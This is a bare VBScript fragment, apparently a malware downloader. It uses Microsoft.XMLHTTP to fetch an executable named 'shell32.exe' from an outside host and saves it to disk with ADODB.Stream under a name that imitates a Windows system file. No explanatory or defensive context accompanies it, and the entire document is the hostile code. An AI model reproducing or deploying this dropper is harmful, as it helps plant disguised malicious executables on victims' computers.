Set xPost = CreateObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://reactor.greatnow.com/shell32.exe",0 
xPost.Send() 
Set sGet = CreateObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "shell32.exe",2 
